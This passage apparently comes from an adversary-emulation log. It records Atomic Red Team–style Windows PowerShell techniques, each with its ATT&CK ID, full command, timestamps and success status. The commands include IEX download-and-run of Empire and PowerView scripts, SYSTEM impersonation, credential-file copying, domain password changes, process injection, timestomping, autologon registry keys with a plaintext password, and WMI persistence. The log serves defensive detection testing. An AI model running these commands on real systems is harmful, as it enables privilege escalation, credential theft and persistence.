                              'Impersonation/Theft'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' "
            '-UseBasicParsing); Get-System -Technique NamedPipe -Verbose',
 'delegated': '2023-11-30T06:57:32Z',
 'description': "Uses PowerShell and Empire's [GetSystem "
                'module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). '
                'The script creates a named pipe, and a service that writes to '
                'that named pipe. When the service connects to the named pipe, '
                'the script impersonates its security context.\n'
                'When executed successfully, the test displays the domain and '
                "name of the account it's impersonating (local SYSTEM).\n"
                '\n'
                'Reference: '
                'https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/',
 'executor': 'psh',
 'link_id': '798a9f94-f775-426c-a8e7-30780b99fbba',
 'name': 'Named pipe client impersonation',
 'pid': 8720,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' "
                      '-UseBasicParsing); Get-System -Technique NamedPipe '
                      '-Verbose',
 'platform': 'windows',
 'run': '2023-11-30T06:58:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__f5dd56d901db9f95668988426326bc3a__trial_1

atomic_ordering: ['f5dd56d901db9f95668988426326bc3a']
------------------------------
{'ability_id': 'f5dd56d901db9f95668988426326bc3a',
 'agent_reported_time': '2023-11-11T13:09:43Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': 'get-aduser -f * -pr DoesNotRequirePreAuth | where '
            '{$_.DoesNotRequirePreAuth -eq $TRUE}',
 'delegated': '2023-11-28T15:21:46Z',
 'description': 'When successful, accounts that do not require kerberos '
                'pre-auth will be returned\n',
 'executor': 'psh',
 'link_id': '10b5de36-b02b-4f02-a059-0c6cdef114d9',
 'name': 'Enumerate Users Not Requiring Pre Auth (ASRepRoast)',
 'pid': 2516,
 'plaintext_command': 'get-aduser -f * -pr DoesNotRequirePreAuth | where '
                      '{$_.DoesNotRequirePreAuth -eq $TRUE}',
 'platform': 'windows',
 'run': '2023-11-28T15:22:03Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__9d03b18c922b94ebba44d25c430e6e95__trial_1

atomic_ordering: ['9d03b18c922b94ebba44d25c430e6e95']
------------------------------
{'ability_id': '9d03b18c922b94ebba44d25c430e6e95',
 'agent_reported_time': '2023-11-11T13:10:17Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.008',
            'technique_name': 'Email Collection: Mailbox Manipulation'},
 'command': 'New-Item -Path '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
            '-ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data" '
            '-Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName '
            '-Destination '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
            '-Recurse -Force -ErrorAction Ignore }; Remove-Item -Path '
            '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
            '-Recurse -Force -ErrorAction Ignore',
 'delegated': '2023-11-28T20:13:18Z',
 'description': 'Copies and deletes mail data on Windows\n',
 'executor': 'psh',
 'link_id': 'a3923fa1-0907-45b2-965f-552b29104d28',
 'name': 'Copy and Delete Mailbox Data on Windows',
 'pid': 10924,
 'plaintext_command': 'New-Item -Path '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
                      '-ItemType Directory -ErrorAction Ignore; Get-ChildItem '
                      '-Path '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data" '
                      '-Exclude copy | ForEach-Object { Copy-Item -Path '
                      '$_.FullName -Destination '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
                      '-Recurse -Force -ErrorAction Ignore }; Remove-Item '
                      '-Path '
                      '"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy" '
                      '-Recurse -Force -ErrorAction Ignore',
 'platform': 'windows',
 'run': '2023-11-28T20:13:58Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__53187e13ccee0b0d71451ca3fdc1f9d9__trial_1

atomic_ordering: ['53187e13ccee0b0d71451ca3fdc1f9d9']
------------------------------
{'ability_id': '53187e13ccee0b0d71451ca3fdc1f9d9',
 'agent_reported_time': '2023-11-11T13:10:16Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': 'if (Test-Path '
            '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else '
            '{New-Item -Type Directory (split-path '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
            '-ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  '
            '$env:USERNAME -message "Enter password for $env:USERNAME to use '
            'during password change attempt"; $cred.Password | '
            'ConvertFrom-SecureString | Out-File '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  '
            '$credFile = '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if '
            '(Test-Path $credFile) {;     $cred = New-Object -TypeName '
            'System.Management.Automation.PSCredential -ArgumentList '
            '$env:USERNAME, (Get-Content $credFile | '
            'ConvertTo-SecureString);     '
            'if($cred.GetNetworkCredential().Password -eq '
            '"onlyUPandLowChars"){;       Write-Host -ForegroundColor Yellow '
            '"The new password is the same as the password stored in the '
            'credential file. Please specify a different new password."; exit '
            '-1;     };     try {;         $newPassword = '
            'ConvertTo-SecureString onlyUPandLowChars -AsPlainText '
            '-Force;         Set-ADAccountPassword -Identity $env:USERNAME '
            '-OldPassword $cred.password -NewPassword $newPassword;     };     '
            'catch { ;         $_.Exception;         $errCode = '
            '$_.Exception.ErrorCode;         Write-Host "Error code: '
            '$errCode";         if ($errCode -eq 86) {;             Write-Host '
            '-ForegroundColor Yellow "The stored password for the current user '
            'is incorrect. Please run the prereq commands to set the correct '
            'credentials";             Remove-Item $credFile;         '
            '};         exit $errCode;     };     Write-Host -ForegroundColor '
            'Cyan "Successfully changed the password to '
            'onlyUPandLowChars";     $newCred = New-Object '
            'System.Management.Automation.PSCredential ($env:USERNAME, '
            '$(ConvertTo-SecureString "onlyUPandLowChars" -AsPlainText '
            '-Force));     $newCred.Password | ConvertFrom-SecureString | '
            'Out-File $credFile; }; else {;     Write-Host -ForegroundColor '
            'Yellow "You must store the password of the current user by '
            'running the prerequisite commands first"; }',
 'delegated': '2023-11-29T13:56:06Z',
 'description': 'Attempt to change the password of the current domain user in '
                'order to check password policy. Ideally, you would only run '
                'this atomic test to verify that your password policy is '
                'blocking the use of the new password.\n'
                'If the password is succesfully changed to the new password, '
                'the credential file will be updated to reflect the new '
                'password. You can then run the atomic manually and specify a '
                'new password of your choosing, however the\n'
                'password policy will likely prevent you from setting the '
                'password back to what it was. \n',
 'executor': 'psh',
 'link_id': '110fcd10-fbde-46f2-b1f3-d2170ff3812b',
 'name': 'Domain Password Policy Check: Only Two Character Classes',
 'pid': 10456,
 'plaintext_command': 'if (Test-Path '
                      '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { '
                      '; } else {New-Item -Type Directory (split-path '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
                      '-ErrorAction Ignore | Out-Null; $cred = Get-Credential '
                      '-UserName  $env:USERNAME -message "Enter password for '
                      '$env:USERNAME to use during password change attempt"; '
                      '$cred.Password | ConvertFrom-SecureString | Out-File '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  '
                      ';  $credFile = '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; '
                      'if (Test-Path $credFile) {;     $cred = New-Object '
                      '-TypeName System.Management.Automation.PSCredential '
                      '-ArgumentList $env:USERNAME, (Get-Content $credFile | '
                      'ConvertTo-SecureString);     '
                      'if($cred.GetNetworkCredential().Password -eq '
                      '"onlyUPandLowChars"){;       Write-Host '
                      '-ForegroundColor Yellow "The new password is the same '
                      'as the password stored in the credential file. Please '
                      'specify a different new password."; exit -1;     };     '
                      'try {;         $newPassword = ConvertTo-SecureString '
                      'onlyUPandLowChars -AsPlainText -Force;         '
                      'Set-ADAccountPassword -Identity $env:USERNAME '
                      '-OldPassword $cred.password -NewPassword '
                      '$newPassword;     };     catch { ;         '
                      '$_.Exception;         $errCode = '
                      '$_.Exception.ErrorCode;         Write-Host "Error code: '
                      '$errCode";         if ($errCode -eq 86) {;             '
                      'Write-Host -ForegroundColor Yellow "The stored password '
                      'for the current user is incorrect. Please run the '
                      'prereq commands to set the correct '
                      'credentials";             Remove-Item '
                      '$credFile;         };         exit $errCode;     };     '
                      'Write-Host -ForegroundColor Cyan "Successfully changed '
                      'the password to onlyUPandLowChars";     $newCred = '
                      'New-Object System.Management.Automation.PSCredential '
                      '($env:USERNAME, $(ConvertTo-SecureString '
                      '"onlyUPandLowChars" -AsPlainText -Force));     '
                      '$newCred.Password | ConvertFrom-SecureString | Out-File '
                      '$credFile; }; else {;     Write-Host -ForegroundColor '
                      'Yellow "You must store the password of the current user '
                      'by running the prerequisite commands first"; }',
 'platform': 'windows',
 'run': '2023-11-29T13:56:57Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1484_002__multiple__domain_trust_modification__776315112cd7318c4afd38f7847465fb__trial_1

atomic_ordering: ['776315112cd7318c4afd38f7847465fb']
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__61e9071d7b1f01969893d015526e1099__trial_1

atomic_ordering: ['61e9071d7b1f01969893d015526e1099']
------------------------------
{'ability_id': '61e9071d7b1f01969893d015526e1099',
 'agent_reported_time': '2023-11-11T13:10:13Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:TEMP\\"; $InstallerAssemblyFileName = "T1218.004.dll"; '
            '$InstallerAssemblyFullPath = Join-Path -Path '
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            '$CommandLine = "/logfile= /logtoconsole=false /U '
            '`"$InstallerAssemblyFullPath`""; $ExpectedOutput = '
            "'Constructor_Uninstall_'; $TestArgs = @{;     "
            'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
            'OutputAssemblyFileName = $InstallerAssemblyFileName;     '
            "InvocationMethod = 'Executable';     CommandLine = $CommandLine; "
            '}; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
            '@TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw '
            '@"; InstallUtil Uninstall method execution test failure. '
            'Installer assembly execution output did not match the expected '
            'output.; Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'delegated': '2023-11-30T20:31:12Z',
 'description': 'Executes the Uninstall Method. Upon execution, version '
                'information will be displayed the .NET framework install '
                'utility.\n',
 'executor': 'psh',
 'link_id': 'b8f18d69-eb22-4cb6-95b4-68f70321f7f7',
 'name': 'InstallUtil Uninstall method call - /U variant',
 'pid': 2604,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:TEMP\\"; '
                      '$InstallerAssemblyFileName = "T1218.004.dll"; '
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $CommandLine = "/logfile= '
                      '/logtoconsole=false /U `"$InstallerAssemblyFullPath`""; '
                      "$ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = "
                      '@{;     OutputAssemblyDirectory = '
                      '$InstallerAssemblyDir;     OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'Executable';     CommandLine = $CommandLine; }; "
                      '$ActualOutput = '
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if '
                      '($ActualOutput -ne $ExpectedOutput) {;     throw @"; '
                      'InstallUtil Uninstall method execution test failure. '
                      'Installer assembly execution output did not match the '
                      'expected output.; Expected: $ExpectedOutput; Actual: '
                      '$ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T20:31:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1039__collection__data_from_network_shared_drive__73fed1f32224461748c3630217b7d300__trial_1

atomic_ordering: ['73fed1f32224461748c3630217b7d300']
------------------------------
{'ability_id': '73fed1f32224461748c3630217b7d300',
 'agent_reported_time': '2023-11-11T13:10:23Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1039',
            'technique_name': 'Data from Network Shared Drive'},
 'command': 'copy-item -Path '
            '"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password" '
            '-Destination "$Env:TEMP\\Easter_egg.password"',
 'delegated': '2023-11-27T16:48:10Z',
 'description': 'Copy from sensitive File from the c$ of another LAN computer '
                'with powershell\n'
                'https://twitter.com/SBousseaden/status/1211636381086339073',
 'executor': 'psh',
 'link_id': '95110ac6-ada4-4c1a-909c-c4364efbb5c9',
 'name': 'Copy a sensitive File over Administrative share with Powershell',
 'pid': 9200,
 'plaintext_command': 'copy-item -Path '
                      '"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password" '
                      '-Destination "$Env:TEMP\\Easter_egg.password"',
 'platform': 'windows',
 'run': '2023-11-27T16:48:19Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1201__discovery__password_policy_discovery__214be4092770061080ef0781c26bab3e__trial_1

atomic_ordering: ['214be4092770061080ef0781c26bab3e']
------------------------------
{'ability_id': '214be4092770061080ef0781c26bab3e',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1201',
            'technique_name': 'Password Policy Discovery'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-DomainPolicy -verbose',
 'delegated': '2023-11-30T13:23:25Z',
 'description': 'Utilizing PowerView, run Get-DomainPolicy to return the '
                'default domain policy or the domain controller policy for the '
                'current domain or a specified domain/domain controller.\n',
 'executor': 'psh',
 'link_id': '85b8fc72-9bab-4754-a804-469dbffd624e',
 'name': 'Get-DomainPolicy with PowerView',
 'pid': 3788,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-DomainPolicy -verbose',
 'platform': 'windows',
 'run': '2023-11-30T13:23:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__c5951c819c5f6125e0e5987a12a344f9__trial_1

atomic_ordering: ['c5951c819c5f6125e0e5987a12a344f9']
------------------------------
{'ability_id': 'c5951c819c5f6125e0e5987a12a344f9',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]) { ; } else '
            "{Write-Host Prereq's for this test cannot be met automatically};  "
            ";  Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host "
            '"Stream Data Executed"\' -Stream \'streamCommand\'; '
            '$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt '
            "-Stream 'streamcommand'; Invoke-Expression $streamcommand",
 'delegated': '2023-11-28T08:36:10Z',
 'description': 'Creates a file with an alternate data stream and simulates '
                'executing that hidden code/file. Upon execution, "Stream Data '
                'Executed" will be displayed.\n',
 'executor': 'psh',
 'link_id': '33788d12-d14d-4c73-8ee7-ecbbb18f611f',
 'name': 'NTFS Alternate Data Stream Access',
 'pid': 5416,
 'plaintext_command': 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]) { ; } '
                      "else {Write-Host Prereq's for this test cannot be met "
                      'automatically};  ;  Add-Content -Path '
                      '$env:TEMP\\NTFS_ADS.txt -Value \'Write-Host "Stream '
                      'Data Executed"\' -Stream \'streamCommand\'; '
                      '$streamcommand = Get-Content -Path '
                      "$env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'; "
                      'Invoke-Expression $streamcommand',
 'platform': 'windows',
 'run': '2023-11-28T08:36:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__d143172642328567d9d0951cb116e3a2__trial_1

atomic_ordering: ['d143172642328567d9d0951cb116e3a2']
------------------------------
{'ability_id': 'd143172642328567d9d0951cb116e3a2',
 'agent_reported_time': '2023-11-11T13:09:54Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.005',
            'technique_name': 'Signed Binary Proxy Execution: Mshta'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine '
            'JScript -SimulateUserDoubleClick',
 'delegated': '2023-12-01T00:23:21Z',
 'description': 'Executes an HTA Application using JScript script engine '
                'simulating double click.',
 'executor': 'psh',
 'link_id': '8712937a-49e2-47c3-8d67-6ff34620201e',
 'name': 'Invoke HTML Application - Jscript Engine Simulating Double Click',
 'pid': 7216,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHHTMLApplication '
                      '-HTAFilePath Test.hta -ScriptEngine JScript '
                      '-SimulateUserDoubleClick',
 'platform': 'windows',
 'run': '2023-12-01T00:24:06Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1505_002__persistence__server_software_component-_transport_agent__b00d08275bb2b3ef620e103b1fd7b9e4__trial_1

atomic_ordering: ['b00d08275bb2b3ef620e103b1fd7b9e4']
------------------------------
{'ability_id': 'b00d08275bb2b3ef620e103b1fd7b9e4',
 'agent_reported_time': '2023-11-11T13:09:54Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1505.002',
            'technique_name': 'Server Software Component: Transport Agent'},
 'command': 'Install-TransportAgent -Name Security Interop Agent '
            '-TransportAgentFactory '
            'Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory '
            '-AssemblyPath c:\\program files\\microsoft\\Exchange '
            'Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; '
            'Enable-TransportAgent Security Interop Agent; Get-TransportAgent '
            '| Format-List Name,Enabled',
 'delegated': '2023-12-01T12:00:45Z',
 'description': 'Install a Microsoft Exchange Transport Agent for persistence. '
                'This requires execution from an Exchange Client Access Server '
                'and the creation of a DLL with specific exports. Seen in use '
                'by Turla.\n'
                'More details- '
                'https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n',
 'executor': 'psh',
 'link_id': 'b6e49d67-05c1-4fd8-a2eb-4399f9da7bf3',
 'name': 'Install MS Exchange Transport Agent Persistence',
 'pid': 11120,
 'plaintext_command': 'Install-TransportAgent -Name Security Interop Agent '
                      '-TransportAgentFactory '
                      'Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory '
                      '-AssemblyPath c:\\program files\\microsoft\\Exchange '
                      'Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; '
                      'Enable-TransportAgent Security Interop Agent; '
                      'Get-TransportAgent | Format-List Name,Enabled',
 'platform': 'windows',
 'run': '2023-12-01T12:00:58Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1055_002__multiple__process_injection-_portable_executable_injection__ca6a3f579181ea47b7d95779e8d8a79b__trial_1

atomic_ordering: ['ca6a3f579181ea47b7d95779e8d8a79b']
------------------------------
{'ability_id': 'ca6a3f579181ea47b7d95779e8d8a79b',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055.002',
            'technique_name': 'Process Injection: Portable Executable '
                              'Injection'},
 'command': 'Start-Process "971b85_RedInjection.exe"; Start-Sleep -Seconds 7; '
            'Get-Process -Name Notepad -ErrorAction SilentlyContinue | '
            'Stop-Process -Force',
 'delegated': '2023-11-28T00:49:58Z',
 'description': 'This test injects a portable executable into a remote Notepad '
                'process memory using Portable Executable Injection and '
                'base-address relocation techniques. When successful, a '
                'message box will appear with the title "Warning" and the '
                'content "Atomic Red Team" after a few seconds.',
 'executor': 'psh',
 'link_id': 'c66f03fa-775c-413a-a2ec-6da3d8d4c525',
 'name': 'Portable Executable Injection',
 'pid': 11120,
 'plaintext_command': 'Start-Process "971b85_RedInjection.exe"; Start-Sleep '
                      '-Seconds 7; Get-Process -Name Notepad -ErrorAction '
                      'SilentlyContinue | Stop-Process -Force',
 'platform': 'windows',
 'run': '2023-11-28T00:50:22Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__08a146a382df6fea9fa2275073e9d245__trial_1

atomic_ordering: ['08a146a382df6fea9fa2275073e9d245']
------------------------------
{'ability_id': '08a146a382df6fea9fa2275073e9d245',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.006',
            'technique_name': 'Indicator Removal on Host: Timestomp'},
 'command': 'import-module '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1"; '
            'timestomp -dest '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock"',
 'delegated': '2023-11-28T18:55:22Z',
 'description': 'Timestomp kxwn.lock.\n'
                '\n'
                'Successful execution will include the placement of kxwn.lock '
                'in #{file_path} and execution of timestomp.ps1 to modify the '
                'time of the .lock file. \n'
                '\n'
                '[Mitre ATT&CK '
                'Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n',
 'executor': 'psh',
 'link_id': 'b1f42e10-5bec-4519-b887-5dffa98e7440',
 'name': 'Windows - Timestomp a File',
 'pid': 2184,
 'plaintext_command': 'import-module '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1"; '
                      'timestomp -dest '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock"',
 'platform': 'windows',
 'run': '2023-11-28T18:55:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__4df316c222125fe7372723c5b3434977__trial_1

atomic_ordering: ['4df316c222125fe7372723c5b3434977']
------------------------------
{'ability_id': '4df316c222125fe7372723c5b3434977',
 'agent_reported_time': '2023-11-11T13:10:10Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon" -Name AutoAdminLogon -PropertyType '
            'DWord -Value 1 -Force; New-ItemProperty '
            '"HKLM:\\Software\\Policies\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon" -Name DefaultUserName -Value '
            'Administrator -Force; New-ItemProperty '
            '"HKLM:\\Software\\Policies\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon" -Name DefaultDomainName -Value '
            'contoso.com -Force; New-ItemProperty '
            '"HKLM:\\Software\\Policies\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon" -Name DefaultPassword  -Value '
            'password1 -Force',
 'delegated': '2023-12-03T10:50:32Z',
 'description': 'Lockbit Black - Use Registry Editor to turn on automatic '
                'logon\n',
 'executor': 'psh',
 'link_id': '824f8165-ea3e-4609-8b35-d8c0ee24a958',
 'name': 'Lockbit Black - Use Registry Editor to turn on automatic logon '
         '-Powershell',
 'pid': 7528,
 'plaintext_command': 'New-ItemProperty '
                      '"HKLM:\\Software\\Policies\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon" -Name AutoAdminLogon '
                      '-PropertyType DWord -Value 1 -Force; New-ItemProperty '
                      '"HKLM:\\Software\\Policies\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon" -Name DefaultUserName '
                      '-Value Administrator -Force; New-ItemProperty '
                      '"HKLM:\\Software\\Policies\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon" -Name DefaultDomainName '
                      '-Value contoso.com -Force; New-ItemProperty '
                      '"HKLM:\\Software\\Policies\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon" -Name DefaultPassword  '
                      '-Value password1 -Force',
 'platform': 'windows',
 'run': '2023-12-03T10:50:46Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1036_005__defense-evasion__masquerading-_match_legitimate_name_or_location__029770bd7c3a403daeab3af692af0046__trial_1

atomic_ordering: ['029770bd7c3a403daeab3af692af0046']
------------------------------
{'ability_id': '029770bd7c3a403daeab3af692af0046',
 'agent_reported_time': '2023-11-11T13:10:57Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1036.005',
            'technique_name': 'Masquerading: Match Legitimate Name or '
                              'Location'},
 'command': "Add-Type -TypeDefinition @'; public class Test {;     public "
            'static void Main(string[] args) {;         '
            'System.Console.WriteLine("tweet, tweet");     }; }; \'@ '
            '-OutputAssembly "$Env:windir\\Temp\\svchost.exe"; Start-Process '
            '-FilePath "$Env:windir\\Temp\\svchost.exe"',
 'delegated': '2023-11-27T15:48:31Z',
 'description': 'Launch an executable that attempts to masquerade as a '
                'legitimate executable.\n',
 'executor': 'psh',
 'link_id': 'ac19f1d0-6bf4-4ad6-b060-87204c3db690',
 'name': 'Masquerade as a built-in system executable',
 'pid': 10248,
 'plaintext_command': "Add-Type -TypeDefinition @'; public class Test {;     "
                      'public static void Main(string[] args) {;         '
                      'System.Console.WriteLine("tweet, tweet");     }; }; \'@ '
                      '-OutputAssembly "$Env:windir\\Temp\\svchost.exe"; '
                      'Start-Process -FilePath '
                      '"$Env:windir\\Temp\\svchost.exe"',
 'platform': 'windows',
 'run': '2023-11-27T15:49:23Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__938a659c52ed102a8b35c7b1bb49eb11__trial_1

atomic_ordering: ['938a659c52ed102a8b35c7b1bb49eb11']
------------------------------
{'ability_id': '938a659c52ed102a8b35c7b1bb49eb11',
 'agent_reported_time': '2023-11-11T13:10:29Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.003',
            'technique_name': 'Event Triggered Execution: Windows Management '
                              'Instrumentation Event Subscription'},
 'command': '$FilterArgs = '
            "@{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 "
            "EventNameSpace='root\\CimV2';                 "
            'QueryLanguage="WQL";                 Query="SELECT * FROM '
            '__InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA '
            "'Win32_PerfFormattedData_PerfOS_System' AND "
            'TargetInstance.SystemUpTime >= 240 AND '
            'TargetInstance.SystemUpTime < 325"}; $Filter=New-CimInstance '
